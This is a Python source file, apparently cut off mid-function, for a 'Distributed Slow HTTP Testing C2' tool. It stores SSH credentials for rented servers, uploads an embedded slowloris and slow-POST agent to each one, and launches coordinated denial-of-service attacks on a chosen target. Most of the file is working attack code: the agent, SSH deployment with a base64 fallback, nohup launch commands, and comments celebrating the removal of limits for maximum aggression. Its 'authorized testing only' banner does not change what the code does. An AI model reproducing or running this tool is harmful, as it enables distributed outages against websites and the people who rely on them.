#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Complete Terminal Interface (UNLIMITED EDITION)
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse

# Initialize colorama for cross-platform colored output
colorama.init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

class SecurityManager:
    def __init__(self):
        key_file = 'key.key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(key_file, 0o600) 
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        try:
            return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
        except Exception:
            return encrypted_password

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # VPS nodes table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vps_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ssh_port INTEGER DEFAULT 22,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                location TEXT,
                capabilities TEXT
            )
        ''')
        
        # Attack sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                target_url TEXT NOT NULL,
                target_host TEXT,
                attack_type TEXT NOT NULL,
                vps_nodes TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'pending',
                parameters TEXT,
                results TEXT
            )
        ''')
        
        # Attack results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                vps_ip TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                connections_active INTEGER DEFAULT 0,
                packets_sent INTEGER DEFAULT 0,
                status TEXT,
                FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
        # Set secure permissions
        os.chmod(self.db_file, 0o600)
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, username, encrypted_password, port, location))
            conn.commit()
            return cursor.lastrowid
        except sqlite3.IntegrityError:
            return None
        finally:
            conn.close()
    
    def get_all_vps(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM vps_nodes ORDER BY id')
        vps_list = cursor.fetchall()
        conn.close()
        return vps_list
    
    def update_vps_status(self, ip, status):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE vps_nodes SET status = ?, last_seen = ? WHERE ip_address = ?
        ''', (status, datetime.now().isoformat(), ip))
        conn.commit()
        conn.close()
    
    def remove_vps(self, ip):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM vps_nodes WHERE ip_address = ?', (ip,))
        affected_rows = cursor.rowcount
        conn.commit()
        conn.close()
        return affected_rows > 0
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), json.dumps(parameters), datetime.now().isoformat(), 'running'))
        
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def get_attack_sessions(self, limit=20):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT ?', (limit,))
        sessions = cursor.fetchall()
        conn.close()
        return sessions

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout
            )
            
            self.connections[ip] = ssh
            return True, "Connected successfully"
            
        except Exception as e:
            return False, str(e)
    
    def disconnect_vps(self, ip):
        if ip in self.connections:
            try:
                self.connections[ip].close()
                del self.connections[ip]
                return True
            except Exception:
                pass
        return False
    
    def execute_command(self, ip, command, timeout=45):
        if ip not in self.connections:
            return False, "No connection to VPS"
        
        try:
            stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
            
            exit_status = stdout.channel.recv_exit_status()
            
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            
            if exit_status == 0:
                return True, output
            else:
                return False, error if error else f"Command failed with exit status {exit_status}"
                
        except Exception as e:
            return False, str(e)
    
    def deploy_agent(self, ip):
        """Deploy unlimited slow HTTP attack agent to VPS"""
        
        # Complete unlimited agent script
        agent_script = '''#!/usr/bin/env python3
import socket,threading,time,sys,random,string,signal,argparse
from urllib.parse import urlparse

class SlowHTTPAttack:
    def __init__(self,host,port=80):
        self.host,self.port,self.conns,self.running=host,port,[],False
        self.stats={'sent':0,'errors':0,'active':0}
        self.lock = threading.Lock()
    
    def create_socket(self):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((self.host,self.port))
            return s
        except Exception as e:
            with self.lock:
                self.stats['errors']+=1
            return None
    
    def slowloris_attack(self,num_conns=100,delay=15,duration=0):
        print(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        start_time=time.time()
        
        # UNLIMITED: Aggressive connection creation - no artificial limits
        print("[PHASE1] Creating initial connections...")
        for i in range(num_conns):
            if not self.running:
                break
            
            sock=self.create_socket()
            if sock:
                try:
                    # Full HTTP request with multiple headers for maximum server load
                    request = f"GET /?slowloris={random.randint(100000,999999)}&cache={time.time()} HTTP/1.1\\r\\n"
                    request += f"Host: {self.host}\\r\\n"
                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    request += "Pragma: no-cache\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Upgrade-Insecure-Requests: 1\\r\\n"
                    
                    # Convert escape sequences to actual bytes
                    request_bytes = request.encode().decode('unicode_escape').encode()
                    
                    sock.send(request_bytes)
                    self.conns.append(sock)
                    
                    with self.lock:
                        self.stats['sent']+=1
                    
                    if (i+1) % 100 == 0:
                        print(f"[PROGRESS] {i+1}/{num_conns} connections created")
                        
                except Exception as e:
                    with self.lock:
                        self.stats['errors']+=1
                    try:
                        sock.close()
                    except:
                        pass
            
            # MINIMAL DELAY - Maximum connection rate
            if i % 100 == 0:
                time.sleep(0.01)  # Very small delay only every 100 connections
        
        with self.lock:
            self.stats['active']=len(self.conns)
        print(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
        
        if not self.conns:
            print("[ERROR] No connections established, aborting attack")
            return
        
        # Keep connections alive phase - AGGRESSIVE MODE
        print("[PHASE2] Starting aggressive keep-alive phase...")
        cycle_count=0
        
        while self.running and self.conns:
            # Check duration limit
            if duration > 0 and (time.time() - start_time) >= duration:
                print("[DURATION] Time limit reached, stopping attack...")
                break
            
            cycle_count+=1
            active_before=len(self.conns)
            
            # Send multiple headers per connection for maximum server load
            failed_socks = []
            headers_per_cycle = random.randint(2, 5)  # Multiple headers per cycle
            
            for sock in self.conns:
                try:
                    # Send multiple headers to increase server load
                    for _ in range(headers_per_cycle):
                        header_name=''.join(random.choice(string.ascii_letters) for _ in range(random.randint(10,20)))
                        header_value=''.join(random.choice(string.ascii_letters+string.digits+'-_.') for _ in range(random.randint(20,50)))
                        header = f"X-{header_name}: {header_value}\\r\\n"
                        header_bytes = header.encode().decode('unicode_escape').encode()
                        
                        sock.send(header_bytes)
                        with self.lock:
                            self.stats['sent']+=1
                    
                except Exception:
                    failed_socks.append(sock)
                    with self.lock:
                        self.stats['errors']+=1
            
            # Aggressive connection replacement - maintain connection count
            for sock in failed_socks:
                if sock in self.conns:
                    self.conns.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                
                # AGGRESSIVE: Always try to replace lost connections
                replacement_attempts = 3  # Multiple attempts per failed connection
                for attempt in range(replacement_attempts):
                    new_sock=self.create_socket()
                    if new_sock:
                        try:
                            # Full request with randomization
                            req = f"GET /?session={random.randint(100000,999999)}&attempt={attempt} HTTP/1.1\\r\\n"
                            req += f"Host: {self.host}\\r\\n"
                            req += f"User-Agent: SlowHTTP-Agent-{random.randint(1000,9999)}\\r\\n"
                            req += "Connection: keep-alive\\r\\n"
                            req += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n"
                            req_bytes = req.encode().decode('unicode_escape').encode()
                            
                            new_sock.send(req_bytes)
                            self.conns.append(new_sock)
                            with self.lock:
                                self.stats['sent']+=1
                            break  # Success, stop attempting
                        except Exception:
                            try:
                                new_sock.close()
                            except:
                                pass
            
            with self.lock:
                self.stats['active']=len(self.conns)
                active_after=len(self.conns)
                sent = self.stats['sent']
                errors = self.stats['errors']
            
            print(f"[CYCLE {cycle_count}] Active: {active_after} | Headers sent: {sent} | Errors: {errors} | Replaced: {active_before-active_after if active_before > active_after else 0}")
            
            # VARIABLE DELAY for unpredictability
            sleep_time = random.uniform(delay * 0.5, delay * 1.5)
            time.sleep(sleep_time)
    
    def slow_post_attack(self,num_conns=50,delay=10,duration=0):
        print(f"[R.U.D.Y] Starting Slow POST attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        start_time=time.time()
        
        def post_worker(worker_id):
            sock=self.create_socket()
            if not sock:
                print(f"[WORKER {worker_id}] Failed to connect")
                return
            
            try:
                # UNLIMITED: Large content-length for maximum effectiveness
                content_length=random.randint(10000000,100000000)  # 10MB to 100MB range
                
                # Proper HTTP POST format
                post_request = f"POST /form{worker_id}?data=large HTTP/1.1\\r\\n"
                post_request += f"Host: {self.host}\\r\\n"
                post_request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                post_request += f"Content-Length: {content_length}\\r\\n"
                post_request += "Connection: keep-alive\\r\\n"
                post_request += "Expect: 100-continue\\r\\n"  # Forces server to wait
                post_request += "\\r\\n"  # End of headers
                
                # Convert escape sequences properly
                post_bytes = post_request.encode().decode('unicode_escape').encode()
                
                sock.send(post_bytes)
                with self.lock:
                    self.stats['sent']+=1
                    
                print(f"[WORKER {worker_id}] POST headers sent, content-length: {content_length:,} bytes")
                
                # Send POST data extremely slowly - no artificial limits
                bytes_sent=0
                chunk_sizes=[1,2,3,4,5,6,7,8,9,10,15,20]  # Variable chunk sizes
                
                while self.running and bytes_sent < content_length:
                    # Check duration limit
                    if duration > 0 and (time.time() - start_time) >= duration:
                        print(f"[WORKER {worker_id}] Duration limit reached")
                        break
                    
                    # Variable chunk size for unpredictability
                    chunk_size = random.choice(chunk_sizes)
                    remaining = min(chunk_size, content_length - bytes_sent)
                    
                    # Generate data chunk
                    data=''.join(random.choice(string.ascii_letters+string.digits+'=&') for _ in range(remaining))
                    
                    try:
                        sock.send(data.encode())
                        bytes_sent += remaining
                        with self.lock:
                            self.stats['sent'] += remaining
                    except Exception:
                        print(f"[WORKER {worker_id}] Connection lost at {bytes_sent:,} bytes")
                        break
                    
                    # Progress report every 1MB
                    if bytes_sent % 1000000 == 0:
                        progress = (bytes_sent/content_length)*100
                        print(f"[WORKER {worker_id}] Progress: {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
                    
                    # SLOW TRANSMISSION - The core of R.U.D.Y
                    sleep_time = random.uniform(delay * 0.5, delay * 1.5)  # Variable delay
                    time.sleep(sleep_time)
                
                print(f"[WORKER {worker_id}] Completed: {bytes_sent:,} bytes sent")
                
            except Exception as e:
                print(f"[WORKER {worker_id}] Error: {str(e)}")
                with self.lock:
                    self.stats['errors']+=1
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # NO THREAD LIMITS - Use all requested connections
        threads=[]
        print(f"[THREADS] Starting {num_conns} R.U.D.Y worker threads...")
        
        # Start all worker threads
        for i in range(num_conns):
            if not self.running:
                break
            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            print(f"[THREAD {i+1}] Worker started")
            time.sleep(0.1)  # Small stagger to avoid overwhelming
        
        # Monitor all threads
        while self.running:
            if duration > 0 and (time.time() - start_time) >= duration:
                print("[DURATION] Time limit reached, stopping...")
                self.running = False
                break
            
            # Count active threads
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                sent = self.stats['sent']
                errors = self.stats['errors']
            
            print(f"[R.U.D.Y STATUS] Active workers: {active_threads}/{num_conns} | Total bytes sent: {sent:,} | Errors: {errors}")
            
            if active_threads == 0:
                print("[R.U.D.Y] All workers completed")
                break
            
            time.sleep(10)  # Status update interval
    
    def stop_attack(self):
        print("[STOP] Stopping attack...")
        self.running=False
        
        # Close all connections
        for sock in self.conns[:]:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()
        print("[STOP] Attack stopped")

# Better signal handling
attacker = None

def signal_handler(sig,frame):
    global attacker
    print("\\n[SIGNAL] Received interrupt signal")
    if attacker:
        attacker.stop_attack()
    print("[EXIT] Shutting down...")
    sys.exit(0)

def main():
    global attacker
    
    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent - UNLIMITED EDITION')
    parser.add_argument('target',help='Target URL or hostname')
    parser.add_argument('attack_type',choices=['slowloris','slow_post'],help='Type of attack to perform')
    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100, no upper limit)')
    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15, can be 0)')
    parser.add_argument('--duration','-t',type=int,default=0,help='Attack duration in seconds (0=unlimited, default: 0)')
    
    args=parser.parse_args()
    
    # Validate arguments - REMOVED ARTIFICIAL LIMITS
    if args.connections < 1:
        print("ERROR: Connections must be at least 1")
        sys.exit(1)
    
    if args.delay < 0:
        print("ERROR: Delay cannot be negative")
        sys.exit(1)
    
    # Warning for very high connection counts
    if args.connections > 10000:
        print(f"WARNING: Very high connection count ({args.connections:,})")
        print("This may overwhelm your system or network. Continue? (y/N)")
        if input().strip().lower() != 'y':
            sys.exit(1)
    
    # Parse target
    if args.target.startswith('http://') or args.target.startswith('https://'):
        parsed=urlparse(args.target)
        target_host=parsed.hostname
        target_port=parsed.port or (443 if parsed.scheme=='https' else 80)
    else:
        target_host=args.target.split(':')[0]
        if ':' in args.target:
            try:
                target_port = int(args.target.split(':')[1])
            except ValueError:
                target_port = 80
        else:
            target_port=80
    
    print("="*80)
    print("SLOW HTTP ATTACK AGENT - UNLIMITED EDITION")
    print("="*80)
    print(f"Target: {target_host}:{target_port}")
    print(f"Attack: {args.attack_type.upper()}")
    print(f"Connections: {args.connections:,}")
    print(f"Delay: {args.delay}s")
    print(f"Duration: {'Unlimited' if args.duration==0 else f'{args.duration}s'}")
    print("="*80)
    print("WARNING: FOR AUTHORIZED TESTING ONLY!")
    print("="*80)
    
    # Set up signal handlers
    signal.signal(signal.SIGINT,signal_handler)
    signal.signal(signal.SIGTERM,signal_handler)
    
    # Create attacker instance
    attacker=SlowHTTPAttack(target_host,target_port)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections,args.delay,args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections,args.delay,args.duration)
    except KeyboardInterrupt:
        print("\\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
'''
        
        # Use proper file transfer method
        commands = [
            "mkdir -p /tmp/slowhttp_c2",
            "rm -f /tmp/slowhttp_c2/agent.py"  # Clean old version
        ]
        
        # Execute setup commands
        for cmd in commands:
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"Setup failed: {output}"
        
        # Transfer file using SFTP instead of base64 encoding
        try:
            if ip in self.connections:
                sftp = self.connections[ip].open_sftp()
                
                # Write agent script to temporary local file
                temp_file = f"/tmp/agent_{ip.replace('.','_')}.py"
                with open(temp_file, 'w') as f:
                    f.write(agent_script)
                
                # Upload via SFTP
                sftp.put(temp_file, '/tmp/slowhttp_c2/agent.py')
                sftp.close()
                
                # Clean up local temp file
                os.remove(temp_file)
                
            else:
                return False, "No SSH connection available"
        
        except Exception as e:
            # Fallback to base64 method if SFTP fails
            encoded_script = base64.b64encode(agent_script.encode()).decode()
            cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"File transfer failed: {output}"
        
        # Set permissions and test
        final_commands = [
            "chmod +x /tmp/slowhttp_c2/agent.py",
            "python3 -m py_compile /tmp/slowhttp_c2/agent.py",  # Compile to check syntax
            "python3 /tmp/slowhttp_c2/agent.py --help | head -5"  # Test execution
        ]
        
        for i, cmd in enumerate(final_commands):
            success, output = self.execute_command(ip, cmd, timeout=20)
            if not success:
                return False, f"Final step {i+1} failed: {output}"
        
        return True, "Agent deployed and tested successfully"
    
    def get_connection_status(self, ip):
        return ip in self.connections

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_threads = {}
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        # Parse target URL properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
        else:
            target_host = target_url.split(':')[0].split('/')[0]
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters
        }
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 1000)}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Better command building with validation
            cmd = self._build_attack_command_fixed(target_url, attack_type, parameters)
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=15)
            
            if success and "Attack launched with PID" in output:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                # Wait to ensure attack starts properly
                time.sleep(2)
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                failed_vps.append(f"{vps_ip}: {output[:100]}")
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            if failed_vps:
                print(f"{Colors.YELLOW}[FAILED VPS]:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  {failure}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            for failure in failed_vps:
                print(f"  {failure}")
            return False
    
    def _build_attack_command_fixed(self, target_url, attack_type, parameters):
        connections = parameters.get('connections', 100)
        delay = parameters.get('delay', 15) 
        duration = parameters.get('duration', 0)
        
        # Proper target parsing and validation
        target_clean = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        
        # Basic validation only - NO ARTIFICIAL LIMITS
        connections = max(1, connections)  # Only ensure it's positive
        delay = max(0, delay)  # Allow zero delay for maximum aggression
        
        # Unrestricted command construction
        cmd = f"cd /tmp/slowhttp_c2 && "
        cmd += f"nohup python3 agent.py '{target_clean}' {attack_type} "
        cmd += f"--connections {connections} --delay {delay} "
        
        if duration > 0:
            cmd += f"--duration {duration} "
            
        cmd += "> attack_$(date +%s).log 2>&1 & "
        cmd += "sleep 1 && echo 'Attack launched with PID:' $!"
        
        return cmd
    
    def stop_attack(self, session_id):
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[ATTACK] Stopping attack on all VPS nodes...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # More thorough process killing
            commands = [
                # Kill by process name
                "pkill -f 'python3.*agent.py' || true",
                "pkill -9 -f 'python3.*agent.py' || true",
                # Kill by process tree
                "ps aux | grep 'agent.py' | grep -v grep | awk '{print $2}' | xargs kill -15 2>/dev/null || true",
                "sleep 2",
                "ps aux | grep 'agent.py' | grep -v grep | awk '{print $2}' | xargs kill -9 2>/dev/null || true",
                # Verify cleanup
                "ps aux | grep 'agent.py' | grep -v grep | wc -l"
            ]
            
            remaining_procs = None
            for i, cmd in enumerate(commands):
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if i == len(commands) - 1:  # Last command checks remaining processes
                    if success and output.strip().isdigit():
                        remaining_procs = int(output.strip())
            
            if remaining_procs is not None and remaining_procs == 0:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            else:
                print(f"{Colors.YELLOW}PARTIAL{Colors.RESET}")
                stop_count += 1  # Count as success even if partial
        
        self.active_attacks[session_id]['status'] = 'stopped'
        self.active_attacks[session_id]['end_time'] = datetime.now()
        
        print(f"\n{Colors.GREEN}[SUCCESS] Attack stopped on {stop_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
        return True, f"Attack stopped on {stop_count} nodes"
    
    def get_attack_status(self, session_id):
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            # Better process detection
            commands = [
                "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l",
                "pgrep -f 'python3.*agent.py' 2>/dev/null | wc -l"
            ]
            
            active_processes = 0
            for cmd in commands:
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if success and output.strip().isdigit():
                    proc_count = int(output.strip())
                    active_processes = max(active_processes, proc_count)
                    if active_processes > 0:
                        break
            
            # Get additional info if processes are running
            connections_info = ""
            if active_processes > 0:
                net_cmd = "netstat -an 2>/dev/null | grep ESTABLISHED | wc -l || echo 0"
                success, output = self.ssh_manager.execute_command(vps_ip, net_cmd)
                if success and output.strip().isdigit():
                    connections_info = f" ({output.strip()} connections)"
            
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle',
                'connections_info': connections_info
            }
        
        return status

class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        # Stop all active attacks
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        # Close SSH connections
        for ip in list(self.ssh_manager.connections.keys()):
            self.ssh_manager.disconnect_vps(ip)
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                          UNLIMITED EDITION v2.0                             ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}

"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Distributed Attack (UNLIMITED)
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History
{Colors.GREEN}[5]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
        print(menu)
    
    def input_with_prompt(self, prompt, required=True):
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                if not required or value:
                    return value
                print(f"{Colors.RED}This field is required{Colors.RESET}")
            except KeyboardInterrupt:
                return None
    
    def vps_management_menu(self):
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Location':<15} {'Last Seen'}")
                print("-" * 80)
                
                for vps in vps_list:
                    status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                    last_seen = vps[7][:19] if vps[7] else 'Never'
                    print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {(vps[8] or 'Unknown'):<15} {last_seen}")
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections
{Colors.GREEN}[3]{Colors.RESET} Deploy Unlimited Agents to All
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                self.test_single_vps()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            ip = self.input_with_prompt("IP Address: ")
            if not ip:
                return
            
            username = self.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.input_with_prompt("SSH Port (default 22): ", False) or "22"
            try:
                port = int(port)
            except ValueError:
                print(f"{Colors.RED}Invalid port number{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            location = self.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id = self.db_manager.add_vps(ip, username, encrypted_password, port, location)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
